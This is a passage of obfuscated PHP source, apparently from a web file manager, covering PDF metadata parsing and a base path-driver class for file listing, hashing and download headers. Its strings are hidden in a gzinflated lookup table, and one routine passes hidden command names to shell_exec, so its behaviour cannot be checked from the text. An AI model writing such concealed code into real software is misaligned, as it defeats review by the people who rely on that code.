$bߣ[1125]), $bߣ[76] => $DԜ, $bߣ[78] => filesize($DԜ), $bߣ[1429] => $d鹔); goto C; D֔: $e慺 = $bߣ[1434]; preg_match($e慺, $eރω[$bߣ[1430]], $Dó); if (!$A͋[$bߣ[1433]] && count($Dó) == 5) { $A͋[$bߣ[1433]] = $Dó[3]; $A͋[$bߣ[1435]] = $Dó[4]; } goto dǘ; c: if ($f) { $bጯ = $f[$bߣ[1432]][$bߣ[1148]]; $A͋ = self::getObjectValue($eރω, $f, $bጯ); } $A͋ = is_array($A͋) ? $A͋ : array(); $A͋[$bߣ[1433]] = 0; goto D֔; C: $eރω[$bߣ[1430]] = StreamWrapperIO::fread($eރω[$bߣ[768]], 0, $d鹔); $eރω[$bߣ[1431]] = StreamWrapperIO::fread($eރω[$bߣ[768]], $eރω[$bߣ[78]] - $d鹔, $d鹔); $f = self::decodeXref($eރω); goto c; aδ: if ($Dó[1] && $A͋[$bߣ[1437]] < $Dó[1][0]) { $A͋[$bߣ[1437]] = $Dó[1][0]; } $A͋ = self::parseInfoItem($A͋); return $A͋; goto Aܯ; d: preg_match_all($e慺, $eރω[$bߣ[1430]], $Dó); if ($Dó[1] && $A͋[$bߣ[1437]] < $Dó[1][0]) { $A͋[$bߣ[1437]] = $Dó[1][0]; } preg_match_all($e慺, $eރω[$bߣ[1431]], $Dó); goto aδ; dǘ: preg_match($e慺, $eރω[$bߣ[1431]], $Dó); if (!$A͋[$bߣ[1433]] && count($Dó) == 5) { $A͋[$bߣ[1433]] = $Dó[3]; $A͋[$bߣ[1435]] = $Dó[4]; } preg_match($bߣ[1436], $eރω[$bߣ[1430]], $Dó); goto dӓ; dӓ: if ($Dó) { $A͋[$bߣ[1236]] = $Dó[1]; } $A͋[$bߣ[1437]] = 0; $e慺 = $bߣ[1438]; goto d; Aܯ: } private static function parseInfoItem($bŬ) { $c =& $_SERVER[놫Ӱ]; if (!$bŬ) { return !1; } $D礱 = array($c[1237] => array($c[1439], $c[33]), $c[1440] => array($c[1441], $c[33]), $c[184] => array($c[1442], $c[207]), $c[106] => array($c[1443], $c[207]), $c[1437] => array($c[1437], $c[273]), $c[1433] => array($c[1433], $c[273]), $c[1435] => array($c[1435], $c[273]), $c[1444] => array($c[1445], $c[33]), $c[1446] => array($c[1447], $c[33]), $c[1448] => array($c[1236], $c[33])); $b͗䎺 = array(); foreach ($D礱 as $Ağ => $dˢ) { if (!isset($bŬ[$dˢ[0]])) { continue; } $Aދ䭯 = $bŬ[$dˢ[0]]; if (!$Aދ䭯 || is_array($Aދ䭯)) { continue; } switch ($dˢ[1]) { case $c[273]: $Aދ䭯 = intval($Aދ䭯); break; case $c[207]: if (substr($Aދ䭯, 0, 2) == $c[1449]) { $Aދ䭯 = substr($Aދ䭯, 2, 14); } if (strtotime($Aދ䭯)) { $Aދ䭯 = date($c[1450], strtotime($Aދ䭯)); } break; } $b͗䎺[$Ağ] = $Aދ䭯; } return $b͗䎺; } private static function decodeXref(&$AӮ) { goto aӖ; Fɬ߬: if (preg_match($A[1463], $fߨ, $Cѥ) > 0) { $eʸ[$A[1432]][$A[1148]] = intval($Cѥ[1]) . $A[71] . intval($Cѥ[2]); } if (preg_match($A[1464], $fߨ, $Cѥ) > 0) { $eʸ[$A[1432]][$A[364]] = array(); $eʸ[$A[1432]][$A[364]][0] = $Cѥ[1]; $eʸ[$A[1432]][$A[364]][1] = $Cѥ[2]; } if (!$eʸ[$A[1432]][$A[1148]]) { return !1; } goto Fĺ; f̥罞: if ($AӮ[$A[78]] - $Aބ > $AӮ[$A[1429]]) { $b = 4 * $AӮ[$A[1429]]; $AӮ[$A[1429]] = $b; $AӮ[$A[1430]] = StreamWrapperIO::fread($AӮ[$A[768]], 0, $b); $AӮ[$A[1431]] = StreamWrapperIO::fread($AӮ[$A[768]], $AӮ[$A[78]] - $b, $b); $dҿ = $AӮ[$A[1431]]; } $fՍ㌦ = 0; preg_match_all($A[1453], $dҿ, $Cѥ); goto A; A: foreach ($Cѥ[3] as $dǽ => $AߨҺ) { if ($Cѥ[3][$dǽ] == $A[1454]) { $bճ = $fՍ㌦ . $A[71] . intval($Cѥ[2][$dǽ]); $eʸ[$A[1451]][$bճ] = intval($Cѥ[1][$dǽ]); ++$fՍ㌦; } else { if ($Cѥ[3][$dǽ] == $A[1455]) { ++$fՍ㌦; } else { } } } if (preg_match_all($A[1456], $dҿ, $Cѥ)) { $C = $AӮ[$A[78]] - $AӮ[$A[1429]]; foreach ($Cѥ[0] as $dǽ => $fꝠ) { $cޕ = $Cѥ[1][$dǽ] . $A[71] . $Cѥ[2][$dǽ]; $eʸ[$A[1451]][$cޕ] = strpos($dҿ, $fꝠ) + $C + 1; } } if (preg_match_all($A[1457], $dҿ, $Cѥ)) { $fߨ = count($Cѥ[1]) == 1 ? $Cѥ[1][0] : $Cѥ[1][1]; } else { $fߨ = substr($dҿ, -1024 * 5); } goto DϏ; Fĺ: if (preg_match($A[1465], $fߨ, $Cѥ) > 0) { } return $eʸ; goto F; DϏ: if (preg_match($A[1458], $fߨ, $Cѥ) > 0) { $eʸ[$A[1432]][$A[78]] = intval($Cѥ[1]); } if (preg_match($A[1459], $fߨ, $Cѥ) > 0) { $eʸ[$A[1432]][$A[1460]] = intval($Cѥ[1]) . $A[71] . intval($Cѥ[2]); } if (preg_match($A[1461], $fߨ, $Cѥ) > 0) { $eʸ[$A[1432]][$A[1462]] = intval($Cѥ[1]) . $A[71] . intval($Cѥ[2]); } goto Fɬ߬; aӖ: $A =& $_SERVER[놫Ӱ]; $dҿ = $AӮ[$A[1431]]; $eʸ = array($A[1432] => array(), $A[1451] => array()); goto C⍕; C⍕: $BΤ = $A[1452]; if (!preg_match_all($BΤ, $dҿ, $Cѥ, PREG_SET_ORDER, 0)) { return !1; } $Aބ = intval($Cѥ[0][1]); goto f̥罞; F: } private static function getObjectValue($d, $e蓼޸, $EɷӆԂ) { goto d; d: $B̺ =& $_SERVER[놫Ӱ]; $A = self::getObject($d, $e蓼޸[$B̺[1451]][$EɷӆԂ]); if (is_string($A[1])) { return $A[1]; } goto b䌕; b䌕: if (!is_array($A[1])) { return array(); } $f؄ = array(); for ($dҬʋ = 0; $dҬʋ < count($A[1]); $dҬʋ += 2) { $f˺ = $A[1][$dҬʋ]; $Cί挾 = $A[1][$dҬʋ + 1]; if (count($f˺) == 3 && $f˺[0] == $B̺[8]) { $a𖢭 = !1; if ($Cί挾[0] == $B̺[1466]) { $Cί挾 = self::getObject($d, $e蓼޸[$B̺[1451]][$Cί挾[1]]); } $a𖢭 = $Cί挾[1]; if ($a𖢭 === !1) { continue; } if (is_string($a𖢭)) { $a𖢭 = self::decodeStr($a𖢭); } $f؄[$f˺[1]] = $a𖢭; } } goto E; E: return $f؄; goto F; F: } private static function getObject($e, $F) { $dǵ = self::getObjectItem($e, $F); $dǵ = self::getObjectItem($e, $dǵ[2]); return $dǵ; } private static function getObjectItem($f, $a) { goto cʺ; A: $Eۺ = $a >= $a ? $a - $a : $a; $aщ = $a >= $a ? $f[$C⮠ŏ[1431]] : $f[$C⮠ŏ[1430]]; if ($a > $Dޞ && $a <= $a) { $Eۺ = 0; $aщ = StreamWrapperIO::fread($f[$C⮠ŏ[768]], $a, $Dޞ); } goto A; cʺ: $C⮠ŏ =& $_SERVER[놫Ӱ]; $Dޞ = $f[$C⮠ŏ[1429]]; $a = $f[$C⮠ŏ[78]] - $Dޞ; goto A; A: $B܉ = self::getRawObject($aщ, $Eۺ); if ($a >= $a) { $B܉[2] = $B܉[2] + $a; } else { if ($a > $Dޞ && $a <= $a) { $B܉[2] = $B܉[2] + $a; } } return $B܉; goto fѽō; fѽō: } private static function decodeStr($bǻ) { goto dݝ޽; dَ: $bǻ = $A墠[33]; foreach ($b as $D) { if (preg_match($A墠[1476], $D)) { $bǻ .= \chr(octdec(trim($D, $A墠[94]))); } else { $bǻ .= $D; } } $b = preg_split($A墠[1477], $bǻ, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto d; Eݭ˄: $bǻ = $A墠[33]; foreach ($b as $D) { if (preg_match($A墠[1481], $D) && !1 === stripos($D, $A墠[1482])) { $D = preg_replace($A墠[1483], $A墠[33], $D); $D = trim($D, $A墠[919]); $D = pack($A墠[1484], $D); $bǻ .= $D; } else { $bǻ .= $D; } } if (preg_match($A墠[1485], $bǻ)) { $c = substr($bǻ, 2); $bǻ = $A墠[33]; $E֯ۅ = strlen($c); for ($eǮ͋ = 0; $eǮ͋ < $E֯ۅ; $eǮ͋ += 2) { $bԍߺ = hexdec(bin2hex(substr($c, $eǮ͋, 2))); $bǻ .= mb_convert_encoding($A墠[1486] . intval($bԍߺ) . $A墠[68], $A墠[1487], $A墠[1488]); } } goto cӎ; cӎ: return $bǻ; goto eʚ; d: $bǻ = $A墠[33]; foreach ($b as $D) { if (preg_match($A墠[1478], $D)) { $bǻ .= \chr(hexdec(trim($D, $A墠[1479]))); } else { $bǻ .= $D; } } $b = preg_split($A墠[1480], $bǻ, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto Eݭ˄; dݝ޽: $A墠 =& $_SERVER[놫Ӱ]; $bǻ = str_replace(array($A墠[1467], $A墠[1468], $A墠[1469], $A墠[1470], $A墠[1471], $A墠[1472], $A墠[1473], $A墠[1474]), array($A墠[94], $A墠[50], $A墠[8], $A墠[245], $A墠[809], $A墠[214], $A墠[714], $A墠[327]), $bǻ); $b = preg_split($A墠[1475], $bǻ, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto dَ; eʚ: } private static function getRawObject($F, $b֏ = 0) { goto a; e: $b֏ += strspn($F, $e[1489], $b֏); $EƇ = $F[$b֏]; switch ($EƇ) { case $e[1490]: $e؈ = strcspn($F, $e[1491], $b֏); if ($e؈ > 0) { $b֏ += $e؈; return self::getRawObject($F, $b֏); } break; case $e[8]: $b = $EƇ; ++$b֏; $b׍諴 = preg_match($e[1492], substr($F, $b֏, 256), $eΪ); if (1 == $b׍諴) { $dڬ̡ = $eΪ[1]; $b֏ += strlen($dڬ̡); } break; case $e[245]: case $e[809]: $b = $EƇ; ++$b֏; $Dꃾ = $b֏; if ($e[245] == $EƇ) { $c虄 = 1; while ($c虄 > 0) { if (!isset($F[$Dꃾ])) { break; } $fޘ = $F[$Dꃾ]; switch ($fޘ) { case $e[94]: ++$Dꃾ; break; case $e[245]: ++$c虄; break; case $e[809]: --$c虄; break; } ++$Dꃾ; } $dڬ̡ = substr($F, $b֏, $Dꃾ - $b֏ - 1); $b֏ = $Dꃾ; } break; case $e[154]: case $e[468]: $b = $EƇ; ++$b֏; if ($e[154] == $EƇ) { $dڬ̡ = array(); do { $A = $b֏; $aٙӌ = self::getRawObject($F, $b֏); $b֏ = $aٙӌ[2]; $dڬ̡[] = $aٙӌ; } while ($e[468] != $aٙӌ[0] && $b֏ != $A); array_pop($dڬ̡); } break; case $e[918]: case $e[921]: if (isset($F[$b֏ + 1]) && $F[$b֏ + 1] == $EƇ) { $b = $EƇ . $EƇ; $b֏ += 2; if ($e[918] == $EƇ) { $dڬ̡ = array(); do { $A = $b֏; $aٙӌ = self::getRawObject($F, $b֏); $b֏ = $aٙӌ[2]; $dڬ̡[] = $aٙӌ; } while ($e[1493] != $aٙӌ[0] && $b֏ != $A); array_pop($dڬ̡); } } else { $b = $EƇ; ++$b֏; $b׍諴 = preg_match($e[1494], substr($F, $b֏), $eΪ); if ($e[918] == $EƇ && 1 == $b׍諴) { $dڬ̡ = strtr($eΪ[1], $e[1495], $e[33]); $b֏ += \strlen($eΪ[0]); } elseif (!1 !== ($Bٱ = strpos($F, $e[921], $b֏))) { $b֏ = $Bٱ + 1; } } break; default: if ($e[1496] == substr($F, $b֏, 6)) { $b = $e[1496]; $b֏ += 6; } elseif ($e[100] == substr($F, $b֏, 4)) { $b = $e[100]; $b֏ += 4; $dڬ̡ = $e[100]; } elseif ($e[1497] == substr($F, $b֏, 4)) { $b = $e[1498]; $b֏ += 4; $dڬ̡ = $e[1497]; } elseif ($e[1499] == substr($F, $b֏, 5)) { $b = $e[1498]; $b֏ += 5; $dڬ̡ = $e[1499]; } elseif ($e[997] == substr($F, $b֏, 6)) { $b = $e[997]; $b֏ += 6; if (1 == preg_match($e[1500], substr($F, $b֏), $eΪ)) { $b֏ += strlen($eΪ[0]); $f󼃐 = $e[1501]; $b׍諴 = preg_match($f󼃐, substr($F, $b֏), $eΪ, PREG_OFFSET_CAPTURE); if (1 == $b׍諴) { $dڬ̡ = substr($F, $b֏, $eΪ[0][1]); $b֏ += $eΪ[1][1]; } } } elseif ($e[1502] == substr($F, $b֏, 9)) { $b = $e[1502]; $b֏ += 9; } elseif (1 == preg_match($e[1503], substr($F, $b֏, 33), $eΪ)) { $b = $e[1466]; $b֏ += strlen($eΪ[0]); $dڬ̡ = intval($eΪ[1]) . $e[71] . intval($eΪ[2]); } elseif (1 == preg_match($e[1504], substr($F, $b֏, 33), $eΪ)) { $b = $e[1505]; $dڬ̡ = intval($eΪ[1]) . $e[71] . intval($eΪ[2]); $b֏ += strlen($eΪ[0]); } elseif (($Eԏ = strspn($F, $e[1506], $b֏)) > 0) { $b = $e[1507]; $dڬ̡ = substr($F, $b֏, $Eԏ); $b֏ += $Eԏ; } break; } goto cן; a: $e =& $_SERVER[놫Ӱ]; $b = $e[33]; $dڬ̡ = $e[33]; goto e; cן: return array($b, $dڬ̡, $b֏); goto aǹѳ; aǹѳ: } } goto E; ě: $B٫ = $_SERVER[놫Ӱ][539]; if (!$B٫) { die; } $_SERVER[ߗѻ] = explode($_SERVER[놫Ӱ][540], gzinflate(substr($_SERVER[놫Ӱ][541], 10, -8))); goto a; DŪ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $b =& $_SERVER[놫Ӱ]; $this->objectDriver = array($b[57], $b[58], $b[59], $b[60], $b[61], $b[62], $b[63], $b[64], $b[65]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($Eܽ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($Eܽ, $_SERVER[놫Ӱ][8]); } return $Eܽ; } public function getPathName($c鯍) { return $c鯍; } public function iconvApp($BÄڽ) { return $BÄڽ; } public function iconvSystem($b׳) { return $b׳; } public function iconvTo($A؃ƌ, $bȏͷ, $c󢤗) { goto C; Aꏌٔ: return $Bܨ; goto B; Eӗء: $Bܨ = $Bܨ ? $Bܨ : $A؃ƌ; if (strstr($Bܨ, $Dڬ[70])) { $Bܨ = str_replace($Dڬ[70], $Dڬ[71], $Bܨ); } $f녑[$bȏͷ . $Dڬ[67] . $c󢤗 . $Dڬ[68] . $A؃ƌ] = $Bܨ; goto f􂺶ش; Dė: $fÓ = $bȏͷ . $Dڬ[67] . $c󢤗 . $Dڬ[68] . $A؃ƌ; if (isset($f녑[$fÓ])) { return $f녑[$fÓ]; } if (function_exists($Dڬ[69])) { $Bܨ = @mb_convert_encoding($A؃ƌ, $c󢤗, $bȏͷ); } else { $Bܨ = @iconv($bȏͷ, $c󢤗, $A؃ƌ); } goto Eӗء; f􂺶ش: $f녑[$c󢤗 . $Dڬ[67] . $bȏͷ . $Dڬ[68] . $A؃ƌ] = $A؃ƌ; $f녑[$c󢤗 . $Dڬ[67] . $bȏͷ . $Dڬ[68] . $Bܨ] = $A؃ƌ; $f녑[$bȏͷ . $Dڬ[67] . $c󢤗 . $Dڬ[68] . $Bܨ] = $Bܨ; goto Aꏌٔ; C: $Dڬ =& $_SERVER[놫Ӱ]; if (!$A؃ƌ || !function_exists($Dڬ[66])) { return $A؃ƌ; } static $f녑 = array(); goto Dė; B: } public function getPathInner($Eֲ) { $Eȑ = IO::init($Eֲ); return $Eȑ->path; } public function getPathOuter($Eӎ) { $Dյ =& $_SERVER[놫Ӱ]; $B䝾 = strlen(trim($this->pathBase, $Dյ[8])); $Eӎ = substr(trim($Eӎ, $Dյ[8]), $B䝾); return $this->pathDriver . $Dյ[8] . ltrim($Eӎ, $Dյ[8]); } public function isParentOf($Dᇐ, $a뢂) { $Dɠ =& $_SERVER[놫Ӱ]; $Dᇐ = rtrim(strtolower($Dᇐ), $Dɠ[8]) . $Dɠ[8]; $a뢂 = rtrim(strtolower($a뢂), $Dɠ[8]) . $Dɠ[8]; $aՒ = strpos($a뢂, $Dᇐ) === 0; return $aՒ; } public function getType() { $AқΊ =& $_SERVER[놫Ӱ]; $Eܲ܎ = str_replace($AқΊ[72], $AқΊ[33], get_class($this)); return strtolower($Eܲ܎); } public function isTypeObject() { return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($e埍, $d) { $e탇 =& $_SERVER[놫Ӱ]; $dڅ = rtrim($e埍, $e탇[8]) . $e탇[8] . $d; $aɻ = $this->exist($dڅ); return $aɻ ? $dڅ : !1; } public function renameObject($A炘, $F) { $Dďۊù =& $_SERVER[놫Ӱ]; Hook::trigger($Dďۊù[73], $this, $A炘, $this, $this->pathFather($A炘) . $F); $A炘 = $this->getPathOuter($A炘); $F = $this->pathFather($A炘) . $F; if (IO::isFile($A炘)) { $a = IO::move($A炘, $F, REPEAT_RENAME_FOLDER); } else { $a = IO::mkdir($F); if (!$a) { return !1; } $f̼ᗱþ = IO::listPath($A炘, !0); $cǺ = array_merge($f̼ᗱþ[$Dďۊù[74]], $f̼ᗱþ[$Dďۊù[75]]); foreach ($cǺ as $D׿) { IO::move($D׿[$Dďۊù[76]], $F, REPEAT_RENAME_FOLDER); } IO::remove($A炘); } return $a ? $F : !1; } public function tempFile($AϪ = '', $eօ󍷆 = '') { goto E㖺; E: $AȔ = $b鳕 . $AϪ; @touch($AȔ); if ($eօ󍷆) { file_put_contents($AȔ, $eօ󍷆); } goto Dҏ; Dҏ: return $AȔ; goto Eޛ娳; E㖺: if (!$AϪ) { $AϪ = rand_string(15); } $b鳕 = TEMP_FILES . rand_string(15) . $_SERVER[놫Ӱ][8]; @mkdir($b鳕, 511, !0); goto E; Eޛ娳: } public function tempFileRemve($e讟) { @unlink($e讟); @rmdir($this->pathFather($e讟)); } public function mkfile($f, $Fꄧ = '', $Dمݨ = REPEAT_RENAME) { } public function mkdir($C, $d = REPEAT_SKIP) { } public function copyFile($a򔔇, $C) { } public function moveFile($dӿ, $d򚼣) { } public function remove($f) { if ($this->isFile($f)) { return $this->delFile($f); } return $this->delFolder($f); } public function rename($dۉ, $d) { } public function exist($fܤο) { } public function findByHash($a = '', $c玂 = '') { return !1; } public function isFile($a٦) { } public function isFolder($fŢ͛) { } public function size($eː) { } public function info($Dߵֽ) { } public function infoAuth($A) { return $this->info($A); } public function infoFull($Eߪ) { return $this->info($Eߪ); } public function infoWithChildren($Fĸ敌) { $a㫍Ø =& $_SERVER[놫Ӱ]; $c = $this->info($Fĸ敌); if ($c && $c[$a㫍Ø[29]] == $a㫍Ø[77]) { $bҼۘ̂ = array($a㫍Ø[78] => 0, $a㫍Ø[79] => 0, $a㫍Ø[80] => 0); $this->infoChildren($Fĸ敌, $bҼۘ̂); $c[$a㫍Ø[78]] = $bҼۘ̂[$a㫍Ø[78]]; $c[$a㫍Ø[81]] = array($a㫍Ø[82] => $bҼۘ̂[$a㫍Ø[79]], $a㫍Ø[83] => $bҼۘ̂[$a㫍Ø[80]]); } return $c; } public function listPath($b, $EǑ = false) { } public function has($b, $A䟺 = false, $E = false) { } public function canRead($F᭄̅) { } public function canWrite($f) { } public function getContent($B鈊) { } public function setContent($cފ, $F = '') { } protected function infoChildren($Fޝ, &$EëЗ) { $eԗ =& $_SERVER[놫Ӱ]; check_abort(); $Aş = $this->listPath($Fޝ, !0); $Aş = array_merge($Aş[$eԗ[75]], $Aş[$eԗ[74]]); foreach ($Aş as $dմ) { if ($dմ[$eԗ[29]] == $eԗ[77]) { $EëЗ[$eԗ[80]]++; $eщ犬 = $this->getPathInner($dմ[$eԗ[76]]); $this->infoChildren($eщ犬, $EëЗ); } else { $EëЗ[$eԗ[79]]++; $EëЗ[$eԗ[78]] += $dմ[$eԗ[78]]; } } } public function fileSubstr($E҅, $BІ, $Fԇ) { } public function listAll($Fݖܒ) { } public function upload($D, $c, $D渚 = false, $d = REPEAT_REPLACE) { } public function uploadFileByID($B, $Aּ, $eؓ) { } public function uploadFileByPath($D, $C, $a䡆 = array()) { } public function uploadLink($E, $B = 0) { goto b; aӾڊ: if (!in_array($Dʱ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Dܪ = 1024 * 1024 * 10; goto F; b: $b =& $_SERVER[놫Ӱ]; if ($GLOBALS[$b[6]][$b[84]][$b[85]]) { return; } $Dʱ = $this->getType(); goto aӾڊ; F: $Bȶ = $B <= $Dܪ ? $b[86] : $b[87]; if ($Dʱ == $b[61]) { $Bȶ = $b[87]; } $Aݕ = (!$B ? 1 : ceil($B / pow(1024, 3))) * 3600 * 4; goto BĒ; BĒ: $D贝 = $this->{$Bȶ}($E, $Aݕ); if ($D贝) { $D贝[$b[88]] = $E; $D贝[$b[89]] = $Dʱ; } return $D贝; goto dԊج; dԊج: } public function uploadFormData($Eʘ, $E䫡 = 3600) { } public function multiUploadFormData($f̾Ϭ, $aӑ = 3600) { } public function osChunkSize() { $F܍༊ =& $_SERVER[놫Ӱ]; $E¡ = (double) $GLOBALS[$F܍༊[6]][$F܍༊[84]][$F܍༊[90]][$F܍༊[91]]; if (!$E¡) { $E¡ = 1024 * 84 * 10; } return $E¡; } public function download($bѼ, $EǨ) { } public function ext($dȠ) { $e =& $_SERVER[놫Ӱ]; if (strpos($dȠ, $e[8]) === -1) { $dୣ = $dȠ; } else { $dୣ = $this->pathThis($dȠ); } $a = $e[33]; if (strstr($dୣ, $e[92])) { $a = substr($dୣ, strrpos($dୣ, $e[92]) + 1); $a = strtolower($a); } if (strlen($a) > 3 && preg_match($e[93], $a, $fܝ)) { $a = $e[33]; } return $a; } public function pathThis($bż) { $d =& $_SERVER[놫Ӱ]; $bż = str_replace($d[94], $d[8], rtrim($bż, $d[8])); $d = strrpos($bż, $d[8]); if ($d === !1) { return $bż; } return substr($bż, $d + 1); } public function pathFather($e) { $e =& $_SERVER[놫Ӱ]; $e = str_replace($e[94], $e[8], rtrim($e, $e[8])); $a턉 = strrpos($e, $e[8]); if ($a턉 === !1) { return $e[33]; } return substr($e, 0, $a턉 + 1); } public function hashSimple($F) { goto c; c: $D =& $_SERVER[놫Ӱ]; if (!$F) { return md5($D[33]); } $a޶ = $this->size($F); goto aһ; cÓ: $Aߢ = intval($a޶ / $f); $d = $D[33]; for ($eιע = 0; $eιע < $f; $eιע++) { $d .= $this->fileSubstr($F, $Aߢ * $eιע, $DË); } goto c; c: $d .= $this->fileSubstr($F, $a޶ - $DË, $DË); return md5($d) . $a޶; goto aꆌݱ; aһ: $DË = 200; $f = 50; if ($a޶ <= $DË * $f) { return $this->hashMd5($F) . $a޶; } goto cÓ; aꆌݱ: } public static $md5Cache = array(); public function hashMd5($Aۍ) { $Aۍ = $this->iconvSystem($Aۍ); if (isset(self::$md5Cache[$Aۍ])) { return self::$md5Cache[$Aۍ]; } self::$md5Cache[$Aۍ] = $this->hashMd5Shell($Aۍ); if (!self::$md5Cache[$Aۍ]) { self::$md5Cache[$Aۍ] = @md5_file($Aۍ); } return self::$md5Cache[$Aۍ]; } private function hashMd5Shell($bꪳ) { goto aʦ촢; B: $fο = Cache::get($Eɦ܌[98]); if (!$fο) { $Fޭ = BASIC_PATH . $Eɦ܌[99]; $eԻ = md5_file($Fޭ); $fο = $Eɦ܌[100]; foreach ($Aር as $Eܨӱ) { $Bɠ = shell_exec($Eܨӱ . "\x20\42{$Fޭ}\42"); if ($Bɠ && substr(trim($Bɠ), 0, 32) == $eԻ) { $fο = $Eܨӱ; break; } } Cache::set($Eɦ܌[98], $fο, 3600); } if ($fο == $Eɦ܌[100]) { return !1; } goto dɷ; dɷ: $Bɠ = shell_exec($fο . "\x20\x22{$bꪳ}\x22"); return substr($Bɠ, 0, 32); goto cϨ; aʦ촢: $Eɦ܌ =& $_SERVER[놫Ӱ]; if (!function_exists($Eɦ܌[95])) { return !1; } $Aር = array($Eɦ܌[96], $Eɦ܌[97]); goto B; cϨ: } public function link($F) { return $F; } public function fileOut($CԜǘ, $A􎪳 = false, $A = false, $Eԩӆ = '') { goto E; E: $A =& $_SERVER[놫Ӱ]; if (!$CԜǘ || !$this->exist($CԜǘ)) { show_json(LNG($A[101]), !1, $A); } $bӬՒ = $this->getType() == $A[102]; goto Aަԛ; eĒ̉: set_timeout(); $Aǿ = $this->infoFull($CԜǘ); $a = $Aǿ[$A[78]]; goto Bۚ; Bۚ: $B = gmdate($A[105], $Aǿ[$A[106]]); $BΥ = $A ? $A : $this->iconvApp($Aǿ[$A[28]]); $b = 0; goto Eҏ; C: if (isset($_SERVER[$A[129]]) && $_SERVER[$A[129]] == $Eԩӆ) { header($A[130] . $Eԩӆ, !0, 304); die; } header($A[130] . $Eԩӆ); header($A[131] . $B . $A[123]); goto aዪ; Fڕ: if (isset($_SERVER[$A[144]])) { if (preg_match($A[145], $_SERVER[$A[144]], $c롥)) { $b = intval($c롥[1]); if (!empty($c롥[2])) { $e = intval($c롥[2]); } } header($A[146]); header("\x43\157\x6e\x74\x65\156\x74\x2d\122\x61\x6e\x67\x65\x3a\x20\142\171\164\145\x73\40{$b}\55{$e}\57" . $a); } else { header($A[147]); } header($A[148] . ($e - $b + 1)); if ($_SERVER[$A[149]] == $A[150]) { return; } goto BΤ; FѶ: $bݑő = $A[112] . $bݑő . $A[116] . $bݑő; if ($A􎪳) { header($A[117]); header($A[118] . $bݑő); } else { header($A[119] . $bݑő); } header($A[120]); goto Bｲ; Aʕ: while ($b <= $e) { $C̘ = timeFloat(); check_abort(); $Fг = $e - $b + 1; if ($Fг <= $C߮) { $C߮ = $Fг; } echo $this->fileSubstr($CԜǘ, $b, $C߮); $b += $C߮; if ($C߮ == $Fг) { $b = $e + 1; } if ($b㎚) { $a = intval(1000 * 1000 * (timeFloat() - $C̘)); $FӊՉ = $b㎚ - $a; if ($FӊՉ > 5) { usleep($FӊՉ); } } } goto a; b˞珅: if (strstr($c, $A[113])) { $c = $c . $A[114]; } if ($A􎪳 === !1 && !mime_support($c)) { $A􎪳 = !0; $c = $A[115]; } $bݑő = rawurlencode($BΥ); goto FѶ; aІ: header($A[125]); header($A[126]); if (isset($_SERVER[$A[127]]) && strtotime($_SERVER[$A[127]]) == $Aǿ[$A[106]]) { header($A[128], !0, 304); die; } goto C; aዪ: header($A[132] . $BΥ); header($A[133]); header($A[134] . $a); goto D܄; Eҏ: $e = $a - 1; $fʕ = $this->ext($BΥ); if (in_array($fʕ, array($A[107], $A[108], $A[109], $A[110]))) { $fʕ = $A[111]; } goto bӰ; Aަԛ: $A = $GLOBALS[$A[6]][$A[84]][$A[90]][$A[103]]; $B = (double) $GLOBALS[$A[6]][$A[84]][$A[90]][$A[104]] * 1024 * 1024; @ob_end_clean(); goto eĒ̉; bӰ: if (!$Eԩӆ) { $Eԩӆ = md5($B . $this->hashSimple($CԜǘ)); } $Eԩӆ = $A[112] . $Eԩӆ . $A[112]; $c = get_file_mime($fʕ); goto b˞珅; D܄: header($A[135]); $C = strtolower($_SERVER[$A[136]]); if ($bӬՒ && $C && $A) { if (strstr($C, $A[137])) { header($A[138] . $CԜǘ); } else { if (strstr($C, $A[139])) { header($A[140] . $CԜǘ); } else { if (strstr($C, $A[141])) { header($A[142] . $CԜǘ); } } } if ($B) { header($A[143] . $B); } return; } goto Fڕ; BΤ: $C߮ = 1024 * 100; $b㎚ = 0; if ($B) { $b㎚ = intval(1000 * 1000 * ($C߮ / $B)); } goto Aʕ; Bｲ: header($A[121] . $c); header($A[122] . gmdate($A[105], time() + 3600 * 24 * 30) . $A[123]); header($A[124]); goto aІ; a: } public function fileOutServer($D憋, $AӉ = false, $bٯ = false, $B = '') { $this->fileOut($D憋, $AӉ, $bٯ, $B); } public function fileOutLink($A£) { $d߻ =& $_SERVER[놫Ӱ]; if (substr($A£, 0, 7) == $d߻[151]) { $A£ = $d߻[152] . substr($A£, 7); } header($d߻[153] . $A£); die; } public function cacheMehod($B᠎, $Eւ) { goto d; d: $B =& $_SERVER[놫Ӱ]; static $Eߝ = array(); $E = $B[154] . $B᠎ . $B[155] . rtrim($Eւ, $B[8]); goto FǪ; FǪ: $f = isset($Eߝ[$E]) ? $Eߝ[$E] : null; if (!is_null($f)) { return $f; } $f = $this->{$B᠎}($Eւ); goto eڍ; eڍ: $Eߝ[$E] = $f; return $f; goto e٥; e٥: } public function fileOutImage($e, $F = 250) { goto aԇ; E: $Fɵ = DATA_THUMB . $E̊; if (!@file_exists($Fɵ)) { $aïɹ = TEMP_FILES; if (!is_dir($aïɹ)) { mk_dir($aïɹ); } $a⻶ = $aïɹ . $bա . $A݋[92] . $A[$A݋[157]]; if (!@file_exists($a⻶)) { $a⻶ = $this->download($e, $a⻶); } $eք = new ImageThumb($a⻶, $A݋[164]); $eք->prorate($Fɵ, $F, $F); } if (!file_exists($Fɵ) || filesize($Fɵ) < 100) { return @file_exists($a⻶) ? IO::fileOut($a⻶) : $this->fileOut($e); } goto b; aԇ: $A݋ =& $_SERVER[놫Ӱ]; if (substr($e, 0, 4) == $A݋[141]) { $this->fileOutLink($e); } $A = $this->info($e); goto a; AЯ졗: if (!($Aқ״ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $A݋[162]))) { $F = IO::mkdir(IO_PATH_SYSTEM_TEMP . $A݋[163]); } else { $F = KodIO::make($Aқ״); } if ($Aқ״ = IO::fileNameExist($F, $E̊)) { $Fɵ = KodIO::make($Aқ״); return IO::fileOut($Fɵ); } if (!is_dir(DATA_THUMB)) { 